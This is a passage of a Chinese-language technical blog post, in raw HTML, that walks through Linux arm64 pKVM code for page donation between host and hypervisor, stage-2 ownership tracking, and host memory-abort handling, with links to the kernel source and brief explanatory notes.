class=\"title\">kvm_pgtable_visitor_cb</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_pgtable_walk_data *data,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                  <span class=\"type\">const</span> <span class=\"keyword\">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                  <span class=\"keyword\">enum</span> kvm_pgtable_walk_flags visit)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_pgtable_walker</span> *walker = data-&gt;walker;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Ensure the appropriate lock is held (e.g. RCU lock for stage-2 MMU) */</span></span><br><span class=\"line\">        <span class=\"built_in\">WARN_ON_ONCE</span>(<span class=\"built_in\">kvm_pgtable_walk_shared</span>(ctx) &amp;&amp; !<span class=\"built_in\">kvm_pgtable_walk_lock_held</span>());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> walker-&gt;<span class=\"built_in\">cb</span>(ctx, visit);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"donate\"><a href=\"#donate\" class=\"headerlink\" title=\"donate\"></a>donate</h4><p><a href=\"https://github.com/torvalds/linux/blob/master/arch/arm64/kvm/hyp/nvhe/mem_protect.c\">https://github.com/torvalds/linux/blob/master/arch/arm64/kvm/hyp/nvhe/mem_protect.c</a></p>\n<p>__pkvm_owner1_donate_owner2</p>\n<p>把owner1的内存给owner2</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __pkvm_host_donate_hyp(u64 pfn, u64 nr_pages)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret;</span><br><span class=\"line\">        u64 host_addr = <span class=\"built_in\">hyp_pfn_to_phys</span>(pfn);</span><br><span class=\"line\">        u64 hyp_addr = (u64)__hyp_va(host_addr);</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">pkvm_mem_donation</span> donation = &#123;</span><br><span class=\"line\">                .tx        = &#123;</span><br><span class=\"line\">                        .nr_pages        = nr_pages,</span><br><span class=\"line\">                        .initiator        = &#123;</span><br><span class=\"line\">                                .id        = PKVM_ID_HOST,</span><br><span class=\"line\">                                .addr        = host_addr,</span><br><span class=\"line\">                                .host        = &#123;</span><br><span class=\"line\">                                        .completer_addr = hyp_addr,</span><br><span class=\"line\">                                &#125;,</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        .completer        = &#123;</span><br><span class=\"line\">                                .id        = PKVM_ID_HYP,</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">host_lock_component</span>();</span><br><span class=\"line\">        <span class=\"built_in\">hyp_lock_component</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">do_donate</span>(&amp;donation);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">hyp_unlock_component</span>();</span><br><span class=\"line\">        <span class=\"built_in\">host_unlock_component</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> __pkvm_hyp_donate_host(u64 pfn, u64 nr_pages)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret;</span><br><span class=\"line\">        u64 host_addr = <span class=\"built_in\">hyp_pfn_to_phys</span>(pfn);</span><br><span class=\"line\">        u64 hyp_addr = (u64)__hyp_va(host_addr);</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">pkvm_mem_donation</span> donation = &#123;</span><br><span class=\"line\">                .tx        = &#123;</span><br><span class=\"line\">                        .nr_pages        = nr_pages,</span><br><span class=\"line\">                        .initiator        = &#123;</span><br><span class=\"line\">                                .id        = PKVM_ID_HYP,</span><br><span class=\"line\">                                .addr        = hyp_addr,</span><br><span class=\"line\">                                .hyp        = &#123;</span><br><span class=\"line\">                                        .completer_addr = host_addr,</span><br><span class=\"line\">                                &#125;,</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        .completer        = &#123;</span><br><span class=\"line\">                                .id        = PKVM_ID_HOST,</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">host_lock_component</span>();</span><br><span class=\"line\">        <span class=\"built_in\">hyp_lock_component</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">do_donate</span>(&amp;donation);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">hyp_unlock_component</span>();</span><br><span class=\"line\">        <span class=\"built_in\">host_unlock_component</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __do_donate(<span class=\"keyword\">struct</span> pkvm_mem_donation *donation)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">pkvm_mem_transition</span> *tx = &amp;donation-&gt;tx;</span><br><span class=\"line\">    u64 completer_addr;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (tx-&gt;initiator.id) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> PKVM_ID_HOST:</span><br><span class=\"line\">        ret = <span class=\"built_in\">host_initiate_donation</span>(&amp;completer_addr, tx);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> PKVM_ID_HYP:</span><br><span class=\"line\">        ret = <span class=\"built_in\">hyp_initiate_donation</span>(&amp;completer_addr, tx);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        ret = -EINVAL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (tx-&gt;completer.id) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> PKVM_ID_HOST:</span><br><span class=\"line\">        ret = <span class=\"built_in\">host_complete_donation</span>(completer_addr, tx);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> PKVM_ID_HYP:</span><br><span class=\"line\">        ret = <span class=\"built_in\">hyp_complete_donation</span>(completer_addr, tx);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> PKVM_ID_GUEST:</span><br><span class=\"line\">        ret = <span class=\"built_in\">guest_complete_donation</span>(completer_addr, tx);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        ret = -EINVAL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">host_initiate_donation</span><span class=\"params\">(u64 *completer_addr,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                  <span class=\"type\">const</span> <span class=\"keyword\">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        u8 owner_id = tx-&gt;completer.id;</span><br><span class=\"line\">        u64 size = tx-&gt;nr_pages * PAGE_SIZE;</span><br><span class=\"line\"></span><br><span class=\"line\">        *completer_addr = tx-&gt;initiator.host.completer_addr;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">host_stage2_set_owner_locked</span>(tx-&gt;initiator.addr, size, owner_id);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">hyp_initiate_donation</span><span class=\"params\">(u64 *completer_addr,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                 <span class=\"type\">const</span> <span class=\"keyword\">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        u64 size = tx-&gt;nr_pages * PAGE_SIZE;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        *completer_addr = tx-&gt;initiator.hyp.completer_addr;</span><br><span class=\"line\">        ret = <span class=\"built_in\">kvm_pgtable_hyp_unmap</span>(&amp;pkvm_pgtable, tx-&gt;initiator.addr, size);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (ret != size) ? -EFAULT : <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">host_complete_donation</span><span class=\"params\">(u64 addr, <span class=\"type\">const</span> <span class=\"keyword\">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        u64 size = tx-&gt;nr_pages * PAGE_SIZE;</span><br><span class=\"line\">        u8 host_id = tx-&gt;completer.id;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">host_stage2_set_owner_locked</span>(addr, size, host_id);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">hyp_complete_donation</span><span class=\"params\">(u64 addr,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                 <span class=\"type\">const</span> <span class=\"keyword\">struct</span> pkvm_mem_transition *tx)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"type\">void</span> *start = (<span class=\"type\">void</span> *)addr, *end = start + (tx-&gt;nr_pages * PAGE_SIZE);</span><br><span class=\"line\">        <span class=\"keyword\">enum</span> <span class=\"title class_\">kvm_pgtable_prot</span> prot = <span class=\"built_in\">pkvm_mkstate</span>(PAGE_HYP, PKVM_PAGE_OWNED);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">pkvm_create_mappings_locked</span>(start, end, prot);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * kvm_pgtable_stage2_set_owner() - Unmap and annotate pages in the IPA space to</span></span><br><span class=\"line\"><span class=\"comment\"> *                  track ownership.</span></span><br><span class=\"line\"><span class=\"comment\"> * @pgt:    Page-table structure initialised by kvm_pgtable_stage2_init*().</span></span><br><span class=\"line\"><span class=\"comment\"> * @addr:   Base intermediate physical address to annotate.</span></span><br><span class=\"line\"><span class=\"comment\"> * @size:   Size of the annotated range.</span></span><br><span class=\"line\"><span class=\"comment\"> * @mc:     Cache of pre-allocated and zeroed memory from which to allocate</span></span><br><span class=\"line\"><span class=\"comment\"> *      page-table pages.</span></span><br><span class=\"line\"><span class=\"comment\"> * @owner_id:   Unique identifier for the owner of the page.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * By default, all page-tables are owned by identifier 0. This function can be</span></span><br><span class=\"line\"><span class=\"comment\"> * used to mark portions of the IPA space as owned by other entities. When a</span></span><br><span class=\"line\"><span class=\"comment\"> * stage 2 is used with identity-mappings, these annotations allow to use the</span></span><br><span class=\"line\"><span class=\"comment\"> * page-table data structure as a simple rmap.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * Return: 0 on success, negative error code on failure.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">host_stage2_set_owner_locked</span><span class=\"params\">(<span class=\"type\">phys_addr_t</span> addr, u64 size, u8 owner_id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">host_stage2_try</span>(kvm_pgtable_stage2_set_owner, &amp;host_mmu.pgt,</span><br><span class=\"line\">                               addr, size, &amp;host_s2_pool, owner_id);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">kvm_pgtable_stage2_set_owner</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_pgtable *pgt, u64 addr, u64 size,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                 <span class=\"type\">void</span> *mc, u8 owner_id)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">stage2_map_data</span> map_data = &#123;</span><br><span class=\"line\">                .phys                = KVM_PHYS_INVALID,</span><br><span class=\"line\">                .mmu                = pgt-&gt;mmu,</span><br><span class=\"line\">                .memcache        = mc,</span><br><span class=\"line\">                .owner_id        = owner_id,</span><br><span class=\"line\">                .force_pte        = <span class=\"literal\">true</span>,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_pgtable_walker</span> walker = &#123;</span><br><span class=\"line\">                .cb                = stage2_map_walker,</span><br><span class=\"line\">                .flags                = KVM_PGTABLE_WALK_TABLE_PRE |</span><br><span class=\"line\">                                  KVM_PGTABLE_WALK_LEAF,</span><br><span class=\"line\">                .arg                = &amp;map_data,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (owner_id &gt; KVM_MAX_OWNER_ID)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\"></span><br><span class=\"line\">        ret = <span class=\"built_in\">kvm_pgtable_walk</span>(pgt, addr, size, &amp;walker);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">stage2_map_walker</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                             <span class=\"keyword\">enum</span> kvm_pgtable_walk_flags visit)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">stage2_map_data</span> *data = ctx-&gt;arg;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (visit) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> KVM_PGTABLE_WALK_TABLE_PRE:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"built_in\">stage2_map_walk_table_pre</span>(ctx, data);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> KVM_PGTABLE_WALK_LEAF:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"built_in\">stage2_map_walk_leaf</span>(ctx, data);</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EINVAL;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">stage2_map_walker_try_leaf</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> kvm_pgtable_visit_ctx *ctx,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                      <span class=\"keyword\">struct</span> stage2_map_data *data)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"type\">kvm_pte_t</span> <span class=\"keyword\">new</span>;</span><br><span class=\"line\">        u64 phys = <span class=\"built_in\">stage2_map_walker_phys_addr</span>(ctx, data);</span><br><span class=\"line\">        u64 granule = <span class=\"built_in\">kvm_granule_size</span>(ctx-&gt;level);</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_pgtable</span> *pgt = data-&gt;mmu-&gt;pgt;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_pgtable_mm_ops</span> *mm_ops = ctx-&gt;mm_ops;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">stage2_leaf_mapping_allowed</span>(ctx, data))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -E2BIG;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">kvm_phys_is_valid</span>(phys))</span><br><span class=\"line\">                <span class=\"keyword\">new</span> = <span class=\"built_in\">kvm_init_valid_leaf_pte</span>(phys, data-&gt;attr, ctx-&gt;level);</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"keyword\">new</span> = <span class=\"built_in\">kvm_init_invalid_leaf_owner</span>(data-&gt;owner_id);</span><br><span class=\"line\">                    -&gt;<span class=\"built_in\">FIELD_PREP</span>(KVM_INVALID_PTE_OWNER_MASK, owner_id);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Skip updating the PTE if we are trying to recreate the exact</span></span><br><span class=\"line\"><span class=\"comment\">         * same mapping or only change the access permissions. Instead,</span></span><br><span class=\"line\"><span class=\"comment\">         * the vCPU will exit one more time from guest if still needed</span></span><br><span class=\"line\"><span class=\"comment\">         * and then go through the path of relaxing permissions.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">stage2_pte_needs_update</span>(ctx-&gt;old, <span class=\"keyword\">new</span>))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EAGAIN;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* If we&#x27;re only changing software bits, then store them and go! */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_pgtable_walk_shared</span>(ctx) &amp;&amp;</span><br><span class=\"line\">            !((ctx-&gt;old ^ <span class=\"keyword\">new</span>) &amp; ~KVM_PTE_LEAF_ATTR_HI_SW)) &#123;</span><br><span class=\"line\">                <span class=\"type\">bool</span> old_is_counted = <span class=\"built_in\">stage2_pte_is_counted</span>(ctx-&gt;old);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (old_is_counted != <span class=\"built_in\">stage2_pte_is_counted</span>(<span class=\"keyword\">new</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (old_is_counted)</span><br><span class=\"line\">                                mm_ops-&gt;<span class=\"built_in\">put_page</span>(ctx-&gt;ptep);</span><br><span class=\"line\">                        <span class=\"keyword\">else</span></span><br><span class=\"line\">                                mm_ops-&gt;<span class=\"built_in\">get_page</span>(ctx-&gt;ptep);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"built_in\">WARN_ON_ONCE</span>(!<span class=\"built_in\">stage2_try_set_pte</span>(ctx, <span class=\"keyword\">new</span>));</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">         <span class=\"keyword\">if</span> (!<span class=\"built_in\">stage2_try_break_pte</span>(ctx, data-&gt;mmu))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> -EAGAIN;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Perform CMOs before installation of the guest stage-2 PTE */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_pgtable_walk_skip_cmo</span>(ctx) &amp;&amp; mm_ops-&gt;dcache_clean_inval_poc &amp;&amp;</span><br><span class=\"line\">            <span class=\"built_in\">stage2_pte_cacheable</span>(pgt, <span class=\"keyword\">new</span>))</span><br><span class=\"line\">                mm_ops-&gt;<span class=\"built_in\">dcache_clean_inval_poc</span>(<span class=\"built_in\">kvm_pte_follow</span>(<span class=\"keyword\">new</span>, mm_ops),</span><br><span class=\"line\">                                               granule);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_pgtable_walk_skip_cmo</span>(ctx) &amp;&amp; mm_ops-&gt;icache_inval_pou &amp;&amp;</span><br><span class=\"line\">            <span class=\"built_in\">stage2_pte_executable</span>(<span class=\"keyword\">new</span>))</span><br><span class=\"line\">                mm_ops-&gt;<span class=\"built_in\">icache_inval_pou</span>(<span class=\"built_in\">kvm_pte_follow</span>(<span class=\"keyword\">new</span>, mm_ops), granule);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">stage2_make_pte</span>(ctx, <span class=\"keyword\">new</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">pkvm_create_mappings_locked</span><span class=\"params\">(<span class=\"type\">void</span> *from, <span class=\"type\">void</span> *to, <span class=\"keyword\">enum</span> kvm_pgtable_prot prot)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> start = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)from;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> end = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)to;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> virt_addr;</span><br><span class=\"line\">    <span class=\"type\">phys_addr_t</span> phys;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">hyp_assert_lock_held</span>(&amp;pkvm_pgd_lock);</span><br><span class=\"line\"></span><br><span class=\"line\">    start = start &amp; PAGE_MASK;</span><br><span class=\"line\">    end = <span class=\"built_in\">PAGE_ALIGN</span>(end);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (virt_addr = start; virt_addr &lt; end; virt_addr += PAGE_SIZE) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> err;</span><br><span class=\"line\"></span><br><span class=\"line\">        phys = <span class=\"built_in\">hyp_virt_to_phys</span>((<span class=\"type\">void</span> *)virt_addr);</span><br><span class=\"line\">        err = <span class=\"built_in\">kvm_pgtable_hyp_map</span>(&amp;pkvm_pgtable, virt_addr, PAGE_SIZE,</span><br><span class=\"line\">                      phys, prot);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (err)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> err;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>移除host和加入host用的是同一个函数 pte都是INVALID 只有owner id的区别</p>\n<p><a href=\"https://github.com/torvalds/linux/commit/807923e04a0f5c6c34dc2eb52ae544cb0e4e4e66\">https://github.com/torvalds/linux/commit/807923e04a0f5c6c34dc2eb52ae544cb0e4e4e66</a></p>\n<p>根据注释 这个函数就是unmap host stage2并且记录这个page的owner</p>\n<p>但是如果owner是host的话为什么还要被unmap？ 因为是lazy </p>\n<h3 id=\"Host-page-fault\"><a href=\"#Host-page-fault\" class=\"headerlink\" title=\"Host page fault\"></a>Host page fault</h3><p>Host mem abort 检查相应的owner id</p>\n<p>pte是0表示host 非0表示非host 不能访问</p>\n<p><a href=\"https://github.com/torvalds/linux/commit/1025c8c0c6accfcbdc8f52ca1940160f65cd87d6#diff-7969c9fdf376542af1e6061b538248f414f446349207e6460671f07cdf5fb7beR239\">https://github.com/torvalds/linux/commit/1025c8c0c6accfcbdc8f52ca1940160f65cd87d6#diff-7969c9fdf376542af1e6061b538248f414f446349207e6460671f07cdf5fb7beR239</a></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=OGM5YmUxZWFlNjIxMWNjZDk0NmQyZGYzMDRiZjY3NjlfVHhhNTJrNTFvUVZVcWhkNm04VWRCOTIwUGFmZnAxVVJfVG9rZW46Q2I5NGJQamJFb1pRcTh4WHR4Y2M4a1BhbmRlXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA\" alt=\"img\"></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGIyNzE5OGE4ZGU1MDk2MDgwOWQ1OWFmMzYzZDk4OWVfaEpmZmpSeDFRNE1EVmZkSEROVVJHdEVDQVJYOUh2bHNfVG9rZW46RmhmVGJ4NklSb3RwdzF4dzhyRmNyeWFCbm9kXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA\" alt=\"img\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">handle_host_mem_abort</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_cpu_context *host_ctxt)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_vcpu_fault_info</span> fault;</span><br><span class=\"line\">    u64 esr, addr;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    esr = <span class=\"built_in\">read_sysreg_el2</span>(SYS_ESR);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!__get_fault_info(esr, &amp;fault)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* Setting the address to an invalid value for use in tracing. */</span></span><br><span class=\"line\">        addr = (u64)<span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * We&#x27;ve presumably raced with a page-table change which caused</span></span><br><span class=\"line\"><span class=\"comment\">         * AT to fail, try again.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    addr = (fault.hpfar_el2 &amp; HPFAR_MASK) &lt;&lt; <span class=\"number\">8</span>;</span><br><span class=\"line\">    ret = <span class=\"built_in\">host_stage2_idmap</span>(addr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret == -EPERM)</span><br><span class=\"line\">        <span class=\"built_in\">host_inject_abort</span>(host_ctxt);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">BUG_ON</span>(ret &amp;&amp; ret != -EAGAIN);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">host_stage2_idmap</span><span class=\"params\">(u64 addr)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_mem_range</span> range;</span><br><span class=\"line\">    <span class=\"type\">bool</span> is_memory = !!<span class=\"built_in\">find_mem_range</span>(addr, &amp;range);</span><br><span class=\"line\">    <span class=\"keyword\">enum</span> <span class=\"title class_\">kvm_pgtable_prot</span> prot;</span><br><span class=\"line\">    <span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    prot = is_memory ? PKVM_HOST_MEM_PROT : PKVM_HOST_MMIO_PROT;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">host_lock_component</span>();</span><br><span class=\"line\">    ret = <span class=\"built_in\">host_stage2_adjust_range</span>(addr, &amp;range);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret)</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> unlock;</span><br><span class=\"line\"></span><br><span class=\"line\">    ret = <span class=\"built_in\">host_stage2_idmap_locked</span>(range.start, range.end - range.start, prot);</span><br><span class=\"line\">unlock:</span><br><span class=\"line\">    <span class=\"built_in\">host_unlock_component</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title\">host_stage2_adjust_range</span><span class=\"params\">(u64 addr, <span class=\"keyword\">struct</span> kvm_mem_range *range)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span 